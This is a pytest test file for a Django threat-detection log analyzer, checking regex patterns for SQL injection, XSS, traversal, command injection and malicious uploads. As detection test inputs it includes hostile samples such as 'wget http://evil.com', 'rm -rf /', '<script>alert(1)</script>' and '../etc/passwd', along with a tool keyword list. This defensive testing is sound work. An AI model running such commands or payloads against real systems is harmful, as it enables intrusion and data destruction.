import pytest

from threatapp.models import ThreatDetection
from threatapp.services.log_analyzer import THREAT_PATTERNS, analyze_logs


@pytest.mark.django_db
class TestLogAnalyzer:
    def test_threat_patterns_exist(self):
        assert 'SQL Injection' in THREAT_PATTERNS
        assert 'XSS Attack' in THREAT_PATTERNS
        assert 'Unauthorized Access' in THREAT_PATTERNS
        assert 'Brute Force Attempt' in THREAT_PATTERNS
        assert 'Directory Traversal' in THREAT_PATTERNS
        assert 'Web Scraping' in THREAT_PATTERNS
        assert '404 Probing' in THREAT_PATTERNS
        assert 'Buffer Overflow' in THREAT_PATTERNS
        assert 'Command Injection' in THREAT_PATTERNS
        assert 'Malicious User Agent' in THREAT_PATTERNS
        assert 'Port Scanning' in THREAT_PATTERNS
        assert 'DDoS Attack' in THREAT_PATTERNS
        assert 'Malicious File Upload' in THREAT_PATTERNS
        assert len(THREAT_PATTERNS) == 13

    def test_sql_injection_pattern(self):
        pattern, severity = THREAT_PATTERNS['SQL Injection']
        assert severity == 'High'
        import re
        assert re.search(pattern, 'UNION SELECT * FROM users', re.IGNORECASE)
        assert re.search(pattern, 'SELECT * FROM users', re.IGNORECASE)
        assert re.search(pattern, 'INSERT INTO table VALUES (1)', re.IGNORECASE)
        assert re.search(pattern, 'DROP TABLE users', re.IGNORECASE)

    def test_xss_pattern(self):
        pattern, severity = THREAT_PATTERNS['XSS Attack']
        assert severity == 'High'
        import re
        assert re.search(pattern, '<script>alert(1)</script>', re.IGNORECASE)
        assert re.search(pattern, 'javascript:alert(1)', re.IGNORECASE)
        assert re.search(pattern, 'onerror=alert(1)', re.IGNORECASE)

    def test_unauthorized_access_pattern(self):
        pattern, severity = THREAT_PATTERNS['Unauthorized Access']
        assert severity == 'High'
        import re
        assert re.search(pattern, '401')
        assert re.search(pattern, '403')

    def test_brute_force_pattern(self):
        pattern, severity = THREAT_PATTERNS['Brute Force Attempt']
        assert severity == 'Medium'
        import re
        assert re.search(pattern, 'failed login', re.IGNORECASE)
        assert re.search(pattern, 'password incorrect', re.IGNORECASE)

    def test_directory_traversal_pattern(self):
        pattern, severity = THREAT_PATTERNS['Directory Traversal']
        assert severity == 'Medium'
        import re
        assert re.search(pattern, '../etc/passwd')
        assert re.search(pattern, '..\\windows\\system32')

    def test_web_scraping_pattern(self):
        pattern, severity = THREAT_PATTERNS['Web Scraping']
        assert severity == 'Low'
        import re
        assert re.search(pattern, 'Scrapy', re.IGNORECASE)
        assert re.search(pattern, 'Python-urllib', re.IGNORECASE)
        assert re.search(pattern, 'wget', re.IGNORECASE)
        assert re.search(pattern, 'curl', re.IGNORECASE)

    def test_404_probing_pattern(self):
        pattern, severity = THREAT_PATTERNS['404 Probing']
        assert severity == 'Low'
        import re
        assert re.search(pattern, '404')

    def test_buffer_overflow_pattern(self):
        pattern, severity = THREAT_PATTERNS['Buffer Overflow']
        assert severity == 'High'
        import re
        long_string = 'A' * 1500
        assert re.search(pattern, long_string)
        short_string = 'A' * 100
        assert not re.search(pattern, short_string)

    def test_command_injection_pattern(self):
        pattern, severity = THREAT_PATTERNS['Command Injection']
        assert severity == 'High'
        import re
        assert re.search(pattern, 'wget http://evil.com', re.IGNORECASE)
        assert re.search(pattern, 'curl http://evil.com', re.IGNORECASE)
        assert re.search(pattern, 'rm -rf /', re.IGNORECASE)
        assert re.search(pattern, 'chmod +x script.sh', re.IGNORECASE)

    def test_malicious_user_agent_pattern(self):
        pattern, severity = THREAT_PATTERNS['Malicious User Agent']
        assert severity == 'High'
        import re
        assert re.search(pattern, 'sqlmap', re.IGNORECASE)
        assert re.search(pattern, 'nmap', re.IGNORECASE)
        assert re.search(pattern, 'nikto', re.IGNORECASE)
        assert re.search(pattern, 'metasploit', re.IGNORECASE)

    def test_port_scanning_pattern(self):
        pattern, severity = THREAT_PATTERNS['Port Scanning']
        assert severity == 'Medium'
        import re
        assert re.search(pattern, 'SYN_SCAN')
        assert re.search(pattern, 'NMAP_SCAN')

    def test_ddos_attack_pattern(self):
        pattern, severity = THREAT_PATTERNS['DDoS Attack']
        assert severity == 'High'
        import re
        log_line = '192.168.1.1 GET /page1 192.168.1.1 POST /page2'
        assert re.search(pattern, log_line)

    def test_malicious_file_upload_pattern(self):
        pattern, severity = THREAT_PATTERNS['Malicious File Upload']
        assert severity == 'High'
        import re
        assert re.search(pattern, 'upload shell.php', re.IGNORECASE)
        assert re.search(pattern, 'upload script.jsp', re.IGNORECASE)
        assert re.search(pattern, 'upload malware.aspx', re.IGNORECASE)
        assert re.search(pattern, 'upload backdoor.sh', re.IGNORECASE)
        assert re.search(pattern, 'upload virus.bat', re.IGNORECASE)

    def test_analyze_logs_creates_detections(self, threat_log):
        analyze_logs(threat_log)
        threat_log.refresh_from_db()
        assert threat_log.analyzed is True
        detections = ThreatDetection.objects.filter(log=threat_log)
        assert detections.count() >= 2
        types = set(d.threat_type for d in detections)
        assert 'Unauthorized Access' in types
